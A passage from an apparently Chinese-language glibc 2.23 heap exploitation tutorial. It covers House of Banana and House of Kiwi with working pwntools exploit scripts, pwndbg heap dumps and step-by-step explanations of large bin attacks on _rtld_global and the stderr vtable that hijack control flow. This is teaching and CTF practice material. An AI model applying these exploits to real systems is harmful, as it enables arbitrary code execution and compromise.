# one_gadget = libc.address + 0xCF70A
one_gadget = magic
log.info(f"libc base: {hex(libc.address)}")
log.info(f"_rtld_global addr: {hex(_rtld_global)}")
log.info(f"link_map0 addr: {hex(link_map0)}")
log.info(f"link_map1 addr: {hex(link_map1)}")
log.info(f"one_gadget addr: {hex(one_gadget)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(_rtld_global - 0x10)
payload += p64(chunk0_addr) + p64(_rtld_global - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

link_map = p64(0) + p64(link_map1)  # l_ld | l_next
link_map += p64(0) + p64(chunk2_addr)  # l_prev | l_real
link_map += p64(0) + p64(0)  # l_ns | l_libname
link_map += p64(0) * 26
link_map += p64(chunk2_addr + (2 + 2 + 2 + 2 + 26) * 8)  # l->l_info[26] DT_FINI_ARRAY
link_map += p64(chunk2_addr + (2 + 2 + 2 + 2 + 26) * 8 + 0x20)  # l->l_info[DT_FINI_ARRAY]->d_un.d_ptr
link_map += p64(chunk2_addr + (2 + 2 + 2 + 2 + 26) * 8 + 0x10)  # l->l_info[DT_FINI_ARRAYSZ]
link_map += p64(8)  # i=l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
link_map += p64(one_gadget)
link_map += p64(0) * 59
link_map += p64(0x800000000)  # l_init_called = 1
edit(2, len(link_map), link_map)
exit_proc()
conn.recvline()
cmd = b"cat src/2.23/house_of_banana/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在漏洞利用链的初始堆布局阶段，连续发起三次内存分配（`malloc`）请求，依次创建 `chunk[0]`、`chunk[1]` 和 `chunk[2]`。此操作旨在主动塑造堆的内存结构，其技术意图如下：

1.  **构造大小对比**：精心设置 `chunk[0]` 和 `chunk[2]` 的请求大小，确保 `chunk[0]` 的实际尺寸（`chunk[0]->size`）**大于** `chunk[2]` 的实际尺寸（`chunk[2]->size`）。例如，在相关利用示例中，`chunk[0]` 的 size 为 0x420，而 `chunk[2]` 的 size 为 0x400。这种预设的大小关系是后续利用 **Large Bin** 管理逻辑的基础。

2.  **插入隔离块**：位于中间的 `chunk[1]` 通常被申请为一个任意大小的块（例如 0x500 字节）。它的主要作用是充当“栅栏”或“隔离器”，其目的是在物理内存上分隔 `chunk[0]` 和 `chunk[2]`。这可以防止在后续释放其中任何一个大型块时，它们与彼此或与 top chunk 发生意外的合并，从而确保每个块都能独立进入预期的 bin（如 unsorted bin 或 large bin），保持利用所需的堆状态稳定性。

3.  **为大型堆块利用（Large Bin Attack）做准备**：此布局是实施 **Large Bin Attack** 的典型起始步骤。`chunk[0]` 和 `chunk[2]` 因其大小被设计为均位于 **large bin** 的尺寸范围内。后续会依次释放它们，并利用 large bin 在维护大小排序链表时存在的指针更新漏洞（即 `victim->bk_nextsize->fd_nextsize = victim` 和 `bck->fd = victim`），通过篡改 `bk_nextsize` 或 `bk` 指针，实现将可控的堆地址写入任意目标内存（如 `_rtld_global`）的效果。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x5bf9411da000
Size: 0x430 (with flag bits: 0x431)

Allocated chunk | PREV_INUSE
Addr: 0x5bf9411da430
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x5bf9411da940
Size: 0x410 (with flag bits: 0x411)

Top chunk | PREV_INUSE
Addr: 0x5bf9411dad50
Size: 0x202b0 (with flag bits: 0x202b1)

pwndbg> 
```

在漏洞利用链的推进中，通过调用 `free(chunks[0])` 主动释放先前申请的大型堆块 `chunks[0]`。由于该 chunk 的尺寸（例如 0x420）超过了 fastbin 的最大范围，它不会被放入快速分配链表，而是被 Glibc 的堆管理器置入 **unsorted bin** 中。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x5bf9411da000 —▸ 0x704e4bb8db78 (main_arena+88) ◂— 0x5bf9411da000
pwndbg> 
```

在利用链的关键阶段，通过发起一次特定的内存分配请求 `malloc(chunks[3])` 来驱动堆管理器（`_int_malloc`）执行内部逻辑，从而改变目标堆块 `chunks[0]` 的管理状态。此次操作的**核心目的与约束条件**如下：

1.  **触发 Bin 转移逻辑**：由于 `chunks[0]` 当前位于 `unsorted bin` 中，而新申请的 `chunks[3]` 的**请求大小（`size`）被刻意设置为大于 `chunks[0]->size`**，因此 `chunks[0]` 无法直接满足此次分配。此时，堆管理器在遍历 `unsorted bin` 寻找合适 chunk 的过程中，会将不匹配的 `chunks[0]` 从其当前链表中摘下，并根据其尺寸重新分类，插入到对应的正规 bin 中。由于 `chunks[0]->size` 属于 large bin 范围，它将被**转移至 `largebins`** 的有序链表中。

2.  **创造泄露条件**：`chunks[0]` 被插入 `largebins` 的过程会初始化或更新其 `fd_nextsize` 和 `bk_nextsize` 指针，这些指针用于在 large bin 中维护大小排序的双向链表。在初始状态下，由于该 large bin 索引中原本为空，这些指针将会会指向 `chunks[0]` 地址。**通过这些指针，可以泄露两类关键地址**：
    *   **Libc 地址**：`largebins` 中 chunk 的 `fd` 或 `bk` 指针指向 `main_arena` 内的某个结构，这与从 unsorted bin 泄露的原理类似，是计算 libc 基址的可靠来源。
    *   **Heap 地址**：`fd_nextsize` 或 `bk_nextsize` 指针指向 `chunks[0]` 地址。通过读取这些指针，可以泄露出**堆上的地址**，从而计算出堆内存的布局基址，这对于后续在堆上精确伪造数据结构至关重要。

3.  **为高级利用奠定基础**：成功泄露 libc 和 heap 地址后，获得了后续利用所必需的“信息基址”。这使得能够实现：
    *   计算出目标函数（如 `system`、`one_gadget`）和关键全局符号（如 `_rtld_global`）的准确运行时地址。
    *   精确控制堆内存布局，知道伪造结构体应放置在何处，以及如何设置指向它们的指针。

因此，**“申请 `chunks[3]` 以触发转移”** 是一个承上启下的重要动作。它不仅是将利用载体（`chunks[0]`）移动到更易受利用的 `largebins` 环境中的必要步骤，更是主动触发堆管理器行为以“吐出”关键地址信息，为整个复杂利用链的后续环节（如 Large Bin Attack 等）提供了必不可少的libc地址和可控的堆块指针。

```bash
pwndbg> largebins 
largebins
0x400-0x430: 0x5bf9411da000 —▸ 0x704e4bb8df68 (main_arena+1096) ◂— 0x5bf9411da000
pwndbg> 
```

在利用链的推进中，执行 **`free(chunks[2])`** 操作，将尺寸较小的 `chunks[2]` 释放至 **unsorted bin**。此步骤旨在向 unsorted bin 中注入第二个大型堆块，与先前已存在的 `chunks[0]`（此时已移至 largebins）形成大小对比（`chunks[0]->size` > `chunks[2]->size`），为触发 **Large Bin** 的排序与插入逻辑创造必备条件。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x5bf9411da940 —▸ 0x704e4bb8db78 (main_arena+88) ◂— 0x5bf9411da940
pwndbg> 
```

紧随其后的是利用的关键操作：**篡改 `chunks[2]` 的元数据**。通过堆溢出或其他写原语，将 `chunks[2]` 的 **`bk`（后向指针）** 修改为 `p64(_rtld_global - 0x10)`，同时将其 **`bk_nextsize`（大小链后向指针）** 修改为 `p64(_rtld_global - 0x20)`。这里的 `_rtld_global` 是动态链接器（`ld.so`）内部的一个全局结构体指针，它管理着链接器运行时状态和已加载库的 `link_map` 链表。

```bash
pwndbg> largebins 
largebins
0x400-0x430 [corrupted]
FD: 0x5bf9411da000 —▸ 0x704e4bb8df68 (main_arena+1096) ◂— 0x5bf9411da000
BK: 0x5bf9411da000 —▸ 0x704e4be22030 (realloc@got[plt]) ◂— 4
pwndbg> x/6gx 0x5bf9411da000
0x5bf9411da000: 0x0000000000000000      0x0000000000000431
0x5bf9411da010: 0x0000704e4bb8df68      0x0000704e4be22030
0x5bf9411da020: 0x00005bf9411da000      0x0000704e4be22020
pwndbg> x/1gx &_rtld_global
0x704e4be22040 <_rtld_local>:   0x0000704e4be23168
pwndbg> 
```

在漏洞利用链的最后触发阶段，通过执行 **malloc(chunks[4])** 发起一次特定的内存分配请求。此操作是 **主动驱动堆管理器执行预设的恶意代码路径，从而将前期的内存布局与指针篡改转化为一次稳定的任意地址写入** 的关键动作。

**其核心机制与目的如下：**

1.  **触发排序与插入逻辑**：此次申请的 `chunks[4]` 的**大小（`size`）需经过精心计算**。它通常被设置为不仅大于仍留在 `unsorted bin` 中的 `chunks[2]` 的尺寸，而且大于已存在于 `largebins` 中的 `chunks[0]` 的尺寸（或满足其他特定的大小关系）。这个尺寸确保了 `chunks[2]` 无法直接满足此次请求，迫使堆管理器 (`_int_malloc`) 进入“遍历 unsorted bin 并将其中的 chunk 整理到对应 smallbin/largebin”的代码路径。

2.  **利用漏洞实现写原语**：当处理到 `unsorted bin` 中的 `chunks[2]` 时，由于其尺寸属于 large bin 范围，且对应索引的 large bin 中已存在 `chunks[0]`，堆管理器会执行 **large bin 的排序插入操作**。在此过程中，它将**使用已被篡改的 `chunks[2]` 的 `bk` 和 `bk_nextsize` 指针**。
    *   依据被篡改为 `_rtld_global - 0x10` 的 `bk` 指针，执行 `bck->fd = victim` 代码，将 `victim`（即 `chunks[2]` 的地址）写入 `(_rtld_global - 0x10) + 0x10`，也就是 `_rtld_global` 地址处。
    *   或依据被篡改为 `_rtld_global - 0x20` 的 `bk_nextsize` 指针，执行 `victim->bk_nextsize->fd_nextsize = victim` 代码，将 `victim` 地址写入 `(_rtld_global - 0x20) + 0x20`，同样覆盖了 `_rtld_global`。

3.  **达成利用目标**：至此，**Large Bin Attack** 完成。成功将**一个可控的堆地址（`chunks[2]`）** 写入动态链接器的全局结构指针 `_rtld_global` 中。这为后续在 `chunks[2]` 所指向的堆内存上**伪造恶意的 `link_map` 结构体**，并将其链接到动态链接器内部的管理链表，进而劫持符号解析、库加载流程并最终执行任意代码，奠定了最为关键的基础。

```bash
pwndbg> x/1gx &_rtld_global
0x704e4be22040 <_rtld_local>:   0x00005bf9411da940
pwndbg> p/x chunks[2]
$1 = {
  size = 0x400,
  addr = 0x5bf9411da950
}
pwndbg> 
```

在成功通过 **Large Bin Attack** 将动态链接器的全局管理指针 `_rtld_global` 篡改为指向可控堆块 `chunks[2]` 的地址后，利用链进入最为关键的**数据结构伪造阶段**。随即在 `chunks[2]` 所指向的堆内存区域内，**精心布局一个完全可控的伪造 `link_map` 结构体**。

`link_map` 是动态链接器（`ld.so`）内部用于管理每一个已加载共享库的核心数据结构，它构成了一个双向链表，记录了库的加载基址、名称、依赖关系以及最重要的**动态节（`.dynamic` section）指针**，该节包含了符号表（`DT_SYMTAB`）、字符串表（`DT_STRTAB`）和过程链接表（`DT_JMPREL`）等关键信息的位置。

在 `chunks[2]` 中伪造此结构时，会精确设置以下关键字段：
*   **`l_name`**：设置为一个指向可控字符串（如伪造的库路径名）的指针。
*   **`l_addr`**：库的加载“基址”偏移，通常设置为`0`或一个计算值，用于后续的地址计算。
*   **`l_info[]` 数组**：这是一个指针数组，索引对应不同的动态节标签（DT_*）。会将其中的 `DT_SYMTAB`、`DT_STRTAB`、`DT_JMPREL` 等条目的指针，**重定向到同样在堆上布置的、伪造的动态节内容**。这些伪造的动态节条目将进一步指向可控的“符号表”、“字符串表”和“重定位表”。
*   **链表指针**：设置 `l_next` 和 `l_prev` 指针，以将伪造的 `link_map` 恰当地插入到 `_rtld_global` 管理的库链表中，确保动态链接器在解析符号或加载依赖时会遍历到它。

```bash
pwndbg> p/x *(struct link_map*)0x00005bf9411da940
$2 = {
  l_addr = 0x0,
  l_name = 0x411,
  l_ld = 0x0,
  l_next = 0x704e4be23700,
  l_prev = 0x0,
  l_real = 0x5bf9411da940,
  l_ns = 0x0,
  l_libname = 0x0,
  l_info = {0x0 <repeats 26 times>, 0x5bf9411daa50, 0x5bf9411daa70, 0x5bf9411daa60, 0x8, 0x5bf9012a8779, 0x0 <repeats 45 times>},
  l_phdr = 0x0,
  l_entry = 0x0,
  l_phnum = 0x0,
  l_ldnum = 0x0,
  l_searchlist = {
    r_list = 0x0,
    r_nlist = 0x0
  },
  l_symbolic_searchlist = {
    r_list = 0x0,
    r_nlist = 0x0
  },
  l_loader = 0x0,
  l_versions = 0x0,
  l_nversions = 0x0,
  l_nbuckets = 0x0,
  l_gnu_bitmask_idxbits = 0x0,
  l_gnu_shift = 0x0,
  l_gnu_bitmask = 0x0,
  {
    l_gnu_buckets = 0x0,
    l_chain = 0x0
  },
  {
    l_gnu_chain_zero = 0x0,
    l_buckets = 0x0
  },
  l_direct_opencount = 0x0,
  l_type = 0x0,
  l_relocated = 0x0,
  l_init_called = 0x1,
  l_global = 0x0,
  l_reserved = 0x0,
  l_phdr_allocated = 0x0,
  l_soname_added = 0x0,
  l_faked = 0x0,
  l_need_tls_init = 0x0,
  l_auditing = 0x0,
  l_audit_any_plt = 0x0,
  l_removed = 0x0,
  l_contiguous = 0x0,
  l_symbolic_in_local_scope = 0x0,
  l_free_initfini = 0x0,
  l_rpath_dirs = {
    dirs = 0x0,
    malloced = 0x0
  },
  l_reloc_result = 0x0,
  l_versyms = 0x0,
  l_origin = 0x0,
  l_map_start = 0x0,
  l_map_end = 0x0,
  l_text_end = 0x0,
  l_scope_mem = {0x0, 0x0, 0x0, 0x0},
  l_scope_max = 0x0,
  l_scope = 0x0,
  l_local_scope = {0x0, 0x0},
  l_file_id = {
    dev = 0x0,
    ino = 0x0
  },
  l_runpath_dirs = {
    dirs = 0x0,
    malloced = 0x0
  },
  l_initfini = 0x0,
  l_reldeps = 0x0,
  l_reldepsmax = 0x0,
  l_used = 0x0,
  l_feature_1 = 0x0,
  l_flags_1 = 0x0,
  l_flags = 0x0,
  l_idx = 0x0,
  l_mach = {
    plt = 0x0,
    gotplt = 0x0,
    tlsdesc_table = 0x0
  },
  l_lookup_cache = {
    sym = 0x0,
    type_class = 0x0,
    value = 0x0,
    ret = 0x410
  },
  l_tls_initimage = 0x510,
  l_tls_initimage_size = 0x0,
  l_tls_blocksize = 0x0,
  l_tls_align = 0x0,
  l_tls_firstbyte_offset = 0x0,
  l_tls_offset = 0x0,
  l_tls_modid = 0x0,
  l_tls_dtor_count = 0x0,
  l_relro_addr = 0x0,
  l_relro_size = 0x0,
  l_serial = 0x0,
  l_audit = 0x5bf9411dadb0
}
pwndbg> p/x ((struct link_map*)0x00005bf9411da940)->l_info[26]
$3 = 0x5bf9411daa50
pwndbg> p/x *(Elf64_Dyn*)0x5bf9411daa50
$4 = {
  d_tag = 0x5bf9411daa50,
  d_un = {
    d_val = 0x5bf9411daa70,
    d_ptr = 0x5bf9411daa70
  }
}
pwndbg> p/x ((struct link_map*)0x00005bf9411da940)->l_info[28]
$5 = 0x5bf9411daa60
pwndbg> p/x *(Elf64_Dyn*)0x5bf9411daa60
$6 = {
  d_tag = 0x5bf9411daa60,
  d_un = {
    d_val = 0x8,
    d_ptr = 0x8
  }
}
pwndbg> x/1gx 0x5bf9411daa70
0x5bf9411daa70: 0x00005bf9012a8779
pwndbg> x/6i 0x00005bf9012a8779
   0x5bf9012a8779 <magic>:      endbr64
   0x5bf9012a877d <magic+4>:    push   rbp
   0x5bf9012a877e <magic+5>:    mov    rbp,rsp
   0x5bf9012a8781 <magic+8>:    lea    rax,[rip+0x949]        # 0x5bf9012a90d1
   0x5bf9012a8788 <magic+15>:   mov    rdi,rax
   0x5bf9012a878b <magic+18>:   call   0x5bf9012a8180 <system@plt>
pwndbg> 
```

在漏洞利用链的最终触发阶段，通过**主动终止程序进程**（例如，使`main`函数正常返回、调用`exit()`函数，或触发一个能使程序流执行至`libc_start_main`退出序列的路径）来引导控制流进入动态链接器的清理例程。此操作将**调用`_dl_fini`函数**。

`_dl_fini`是动态链接器（`ld.so`）内部的核心函数，负责在程序结束或共享库被卸载时执行**资源清理与析构（destructor）调用**。其关键逻辑在于遍历由`_rtld_global`管理的`link_map`链表，对于链表中的每一个库（即每一个`link_map`结构体），它会：
1.  检查并调用该库的**析构函数数组（`DT_FINI_ARRAY`）** 中的函数。
2.  执行其他与库卸载相关的内部清理操作。

在本次利用的上下文中，由于已通过**Large Bin Attack**将`_rtld_global`指针劫持，并使其指向一个在可控堆内存（`chunks[2]`）中精心 **伪造的恶意`link_map`结构体**，因此`_dl_fini`函数所遍历的库链表中包含了这个恶意条目。

在该伪造的`link_map`结构中，通过操控`l_info`数组，将其`DT_FINI_ARRAY`或相关的析构函数指针条目**设置为目标地址**（例如`one_gadget`或`system`函数的地址）。当`_dl_fini`执行到该恶意`link_map`节点，并尝试调用其“析构函数”时，控制流便会被**重定向**至预设的指令序列。

因此，“退出程序，触发`_dl_fini`函数调用”是整个利用链的**最终点火步骤**。它将一次正常的、预期的程序终止过程，转化为触发被植入的恶意代码的“扳机”，成功实现了从内存破坏、到数据伪造、再到稳定获取shell权限的完整利用路径。

```c
void
internal_function
_dl_fini (void)
{
...
#ifdef SHARED
  int do_audit = 0;
 again:
#endif
  for (Lmid_t ns = GL(dl_nns) - 1; ns >= 0; --ns)
    {
      /* Protect against concurrent loads and unloads.  */
      __rtld_lock_lock_recursive (GL(dl_load_lock));

      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;
      /* No need to do anything for empty namespaces or those used for
	 auditing DSOs.  */
      if (nloaded == 0
#ifdef SHARED
	  || GL(dl_ns)[ns]._ns_loaded->l_auditing != do_audit
#endif
	  )
	__rtld_lock_unlock_recursive (GL(dl_load_lock));
      else
	{
	  /* Now we can allocate an array to hold all the pointers and
	     copy the pointers in.  */
	  struct link_map *maps[nloaded];

	  unsigned int i;
	  struct link_map *l;
	  assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);
	  for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l->l_next)
	    /* Do not handle ld.so in secondary namespaces.  */
	    if (l == l->l_real)
	      {
		assert (i < nloaded);

		maps[i] = l;
		l->l_idx = i;
		++i;

		/* Bump l_direct_opencount of all objects so that they
		   are not dlclose()ed from underneath us.  */
		++l->l_direct_opencount;
	      }
	  assert (ns != LM_ID_BASE || i == nloaded);
	  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);
	  unsigned int nmaps = i;

	  /* Now we have to do the sorting.  */
	  _dl_sort_fini (maps, nmaps, NULL, ns);

	  /* We do not rely on the linked list of loaded object anymore
	     from this point on.  We have our own list here (maps).  The
	     various members of this list cannot vanish since the open
	     count is too high and will be decremented in this loop.  So
	     we release the lock so that some code which might be called
	     from a destructor can directly or indirectly access the
	     lock.  */
	  __rtld_lock_unlock_recursive (GL(dl_load_lock));

	  /* 'maps' now contains the objects in the right order.  Now
	     call the destructors.  We have to process this array from
	     the front.  */
	  for (i = 0; i < nmaps; ++i)
	    {
	      struct link_map *l = maps[i];

	      if (l->l_init_called)
		{
		  /* Make sure nothing happens if we are called twice.  */
		  l->l_init_called = 0;

		  /* Is there a destructor function?  */
		  if (l->l_info[DT_FINI_ARRAY] != NULL
		      || l->l_info[DT_FINI] != NULL)
		    {
		      /* When debugging print a message first.  */
		      if (__builtin_expect (GLRO(dl_debug_mask)
					    & DL_DEBUG_IMPCALLS, 0))
			_dl_debug_printf ("\ncalling fini: %s [%lu]\n\n",
					  DSO_FILENAME (l->l_name),
					  ns);

		      /* First see whether an array is given.  */
		      if (l->l_info[DT_FINI_ARRAY] != NULL)
			{
			  ElfW(Addr) *array =
			    (ElfW(Addr) *) (l->l_addr
					    + l->l_info[DT_FINI_ARRAY]->d_un.d_ptr);
			  unsigned int i = (l->l_info[DT_FINI_ARRAYSZ]->d_un.d_val
					    / sizeof (ElfW(Addr)));
			  while (i-- > 0)
			    ((fini_t) array[i]) ();
			}
...
}
```


### 1-27 house of kiwi其一

本方法是一种高级的堆漏洞利用技术，与“House of Orange”同属 **堆内存破坏（Heap）与输入/输出流（IO_FILE）劫持相结合** 的利用范式。其核心目标均是**劫持程序控制流**，但两者在利用对象和触发路径上存在关键差异。

本方法（House of Kiwi）的**核心利用机理**在于：首先通过堆相关漏洞（如Use-After-Free、堆溢出等）获取**任意写原语**，随后利用此能力 **伪造标准错误流`stderr`（对应全局符号`_IO_2_1_stderr_`）的虚表（vtable）**。

与“House of Orange”通常针对`_IO_list_all`链表或通过`_IO_str_overflow`触发不同，House of Kiwi 选择`stderr`作为劫持目标，并精心构造一个恶意的vtable，将其中的关键函数指针（例如`_IO_sync`）篡改为目标地址（如`system`或`one_gadget`）。

**触发路径**也相应调整为：`__malloc_assert` -> `_IO_fflush` -> `_IO_SYNC`。其过程如下：
1.  **触发错误**：通过制造一个堆错误（如`double free`）触发`malloc_printerr`，进而调用`__malloc_assert`。
2.  **调用刷新**：`__malloc_assert`在准备输出错误信息时，会调用`_IO_fflush(stderr)`尝试刷新标准错误流。
3.  **虚表劫持**：`_IO_fflush`内部在满足特定条件时会调用`stderr`的vtable中的`_IO_SYNC`函数指针。由于已提前将`stderr`的vtable指针篡改为一个伪造的vtable，并将伪造vtable中的`_IO_SYNC`项设置为恶意地址，此调用将导致**控制流被劫持**，跳转至此前预设的代码，从而完成利用。

因此，House of Kiwi 是**通过劫持`stderr`的虚表，并利用堆断言失败触发的IO刷新路径**来实现代码执行的一种稳定且强大的技术，尤其适用于那些能控制`stderr`结构但难以直接触发`_IO_list_all`遍历或`_IO_str_overflow`的利用场景。

```c
int
_IO_fflush (_IO_FILE *fp)
{
  if (fp == NULL)
    return _IO_flush_all ();
  else
    {
      int result;
      CHECK_FILE (fp, EOF);
      _IO_acquire_lock (fp);
      result = _IO_SYNC (fp) ? EOF : 0;
      _IO_release_lock (fp);
      return result;
    }
}
libc_hidden_def (_IO_fflush)
```

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/16/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_kiwi/exploit.py)。

核心利用代码如下：

```python
# house of kiwi
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
magic = use_magic()
malloc(0, 0x420)
malloc(1, 0x500)
malloc(2, 0x400)
delete(0)
malloc(3, 0x500)
content = show(0)
main_arena1096 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+1096: {hex(main_arena1096)}")
libc.address = main_arena1096 - 0x38DF68
log.info(f"libc base: {hex(libc.address)}")
# Due to the complexities associated with satisfying one-gadget constraints in specific libc environments,
# I opt for the magic function as a more reliable alternative.
#
# one_gadget = libc.address + 0xCF70A
one_gadget = magic
log.info(f"one_gadget addr: {hex(one_gadget)}")
stderr = libc.address + 0x38E560
log.info(f"stderr addr: {hex(stderr)}")
vtable = stderr + 0xD8
log.info(f"vtable addr: {hex(vtable)}")
__xsputn = libc.address + 0x6BCFB
log.info(f"__xsputn addr: {hex(__xsputn)}")
__overflow = libc.address + 0x6CA11
log.info(f"__overflow addr: {hex(__overflow)}")
__write = libc.address + 0x6BC56
log.info(f"__write addr: {hex(__write)}")

payload = b"A" * 0x10 + b"A"
edit(0, len(payload), payload)
content = show(0)
chunk0_addr = u64(content[0x10 : 0x10 + 6].ljust(8, b"\x00")) - ord("A")
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk2_addr = chunk0_addr + 0x420 + 0x10 + 0x500 + 0x10
log.info(f"chunk2 addr: {hex(chunk2_addr)}")

delete(2)
payload = p64(main_arena1096) + p64(vtable - 0x10)
payload += p64(chunk0_addr) + p64(vtable - 0x20)
edit(0, len(payload), payload)
malloc(4, 0x500)

# (__overflow | __xsputn | __write) just for bypass __fxprintf check
payload = b"\x00" * (0x18 - 0x10) + p64(__overflow)
payload = payload.ljust(0x38 - 0x10, b"\x00") + p64(__xsputn)
payload = payload.ljust(0x60 - 0x10, b"\x00") + p64(one_gadget)
payload = payload.ljust(0x78 - 0x10, b"\x00") + p64(__write)
edit(2, len(payload), payload)
payload = b"\x00" * 0x500 + p64(0) + p64(0x1000)
edit(4, len(payload), payload)
malloc(5, 0x1200)
conn.recvline()
cmd = b"cat src/2.23/house_of_kiwi/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

在漏洞利用链的初始堆布局阶段，发起三次连续且具有特定目的的内存分配请求，依次申请 `chunk[0]`、`chunk[1]` 和 `chunk[2]`。此操作是后续利用的基础，其技术意图和布局细节如下：

1.  **构造关键的大小关系**：精心设置 `chunk[0]` 和 `chunk[2]` 的请求尺寸，确保分配后 `chunk[0]` 的实际大小（`chunk[0]->size`，包含元数据）**严格大于** `chunk[2]` 的实际大小（`chunk[2]->size`）。

2.  **设置隔离块（Fence Chunk）**：位于中间的 `chunk[1]` 通常被申请为一个**任意大小的块**（例如 0x500 字节）。它的主要作用并非存储数据，而是充当“栅栏”或“隔离器”。其物理目的是防止 `chunk[0]` 和 `chunk[2]` 在后续被释放时，与彼此或与堆顶（top chunk）发生意外的合并。这种合并会破坏预设的独立堆块状态，导致利用失败。通过插入 `chunk[1]`，可以确保 `chunk[0]` 和 `chunk[2]` 在释放后能够独立地进入预期的管理链表（如 unsorted bin 或 large bin），为后续操作提供稳定的内存布局。

3.  **为高级堆利用奠定基础**：此布局是实施如 **Large Bin Attack** 等技术的典型起始步骤。`chunk[0]` 和 `chunk[2]` 因其尺寸均被有意设置在 **large bin** 的范围内。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x619d0404b000
Size: 0x430 (with flag bits: 0x431)

Allocated chunk | PREV_INUSE
Addr: 0x619d0404b430
Size: 0x510 (with flag bits: 0x511)

Allocated chunk | PREV_INUSE
Addr: 0x619d0404b940
Size: 0x410 (with flag bits: 0x411)

Top chunk | PREV_INUSE
Addr: 0x619d0404bd50
Size: 0x202b0 (with flag bits: 0x202b1)

pwndbg> 
```

主动调用 `free(chunks[0])`。由于 `chunks[0]` 的尺寸较大（超过 fastbin 阈值），它不会被置入快速分配链表，而是进入 **unsorted bin**。Unsorted bin 是 Glibc 堆管理器中用于缓存刚被释放的中大型 chunk 的单循环双向链表，充当分配时的“第一站”搜索区。此时，`chunks[0]` 的 `fd` 和 `bk` 指针会被堆管理器初始化为指向 `main_arena`（主分配区）内部的某个管理地址（例如 `main_arena.top` 附近的固定位置）。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x619d0404b000 —▸ 0x7db2b5f8db78 (main_arena+88) ◂— 0x619d0404b000
pwndbg> 
```

紧接着，发起一次新的分配请求 `malloc(chunks[3])`。此步骤的**核心约束**在于：所请求的 `chunks[3]->size` 必须 **大于** 仍处于 unsorted bin 中的 `chunks[0]->size`。

*   **触发机制**：由于请求大小大于 unsorted bin 中唯一（或首个）的 `chunks[0]`，`_int_malloc` 在遍历 unsorted bin 时无法直接满足此次分配。于是，堆管理器启动“bin 整理”逻辑：它将 `chunks[0]` 从 unsorted bin 链表中摘下，并根据其尺寸将其插入对应的正规 bin 中。鉴于 `chunks[0]->size` 属于 large bin 范围，它被**转移至 largebins** 对应的尺寸索引链表中。

*   **在 largebins 中的初始化**：Large bins 内部维护着按 chunk 大小降序排列的“大小链”（通过 `fd_nextsize` / `bk_nextsize` 指针）和常规双向链表（通过 `fd` / `bk` 指针）。在 `chunks[0]` 被插入时（尤其是当目标 large bin 初始为空或需要调整顺序时），这些指针会被堆管理器赋予特定值：
    *   `fd` / `bk` 指向 `main_arena` 该 large bin 的链表头，**从而泄露 libc 地址**。
    *   `fd_nextsize` / `bk_nextsize` 指向 `chunks[0]` 地址，**从而泄露 heap 地址**。

```bash
pwndbg> largebins 
largebins
0x400-0x430: 0x619d0404b000 —▸ 0x7db2b5f8df68 (main_arena+1096) ◂— 0x619d0404b000
pwndbg> 
```

在利用链的推进中，执行 **`free(chunks[2])`** 操作，将大型堆块 `chunks[2]` 释放至 **unsorted bin**。

```bash
pwndbg> unsortedbin 
unsortedbin
all: 0x619d0404b940 —▸ 0x7db2b5f8db78 (main_arena+88) ◂— 0x619d0404b940
pwndbg> 
```

紧随其后的是利用的核心操作：**篡改 `chunks[0]` 的元数据**。通过堆溢出、Use-After-Free或其他已获得的写原语，将 `chunks[0]` 的 **`bk`（后向指针）** 修改为 `p64(vtable - 0x10)`，同时将其 **`bk_nextsize`（大小链后向指针）** 修改为 `p64(vtable - 0x20)`。

**此篡改的技术意图与原理如下：**

1.  **预设利用目标**：此处的 `vtable` 是利用的最终目标地址，通常指一个**伪造的 `_IO_FILE_plus` 结构体的虚表（vtable）指针地址**。在如 House of Kiwi 等利用中，控制一个 IO 流的 vtable 意味着可以劫持其所有虚函数调用。

2.  **利用 Large Bin Attack 原语**：此布局旨在精准触发 Glibc 中 Large Bin 排序代码的两处写操作：
    *   **`bck->fd = victim` 路径**：当后续分配触发排序时，`bck` 将被赋值为被篡改的 `bk`（即 `vtable - 0x10`）。执行 `bck->fd = victim` 时，程序会将 `victim`（即 `chunks[2]` 的地址）写入 `bck + 0x10` 的地址，也就是 `vtable` 位置。
    *   **`victim->bk_nextsize->fd_nextsize = victim` 路径**：同理，`victim->bk_nextsize` 指向 `vtable - 0x20`。该行代码会将 `victim` 地址写入 `(victim->bk_nextsize) + 0x20`，同样覆盖 `vtable` 指针。

3.  **偏移计算**：偏移 `-0x10` 和 `-0x20` 是精确定位的需要。在对应的结构体中，`fd` 指针通常位于偏移 `0x10` 处，`fd_nextsize` 指针位于偏移 `0x20` 处。通过将 `bk` 和 `bk_nextsize` 设置为目标地址减去相应偏移，可以确保上述漏洞代码执行加法操作后，恰好将 `victim` 地址写入期望的 `vtable` 指针位置。

```bash
pwndbg> largebins 
largebins
0x400-0x430 [corrupted]
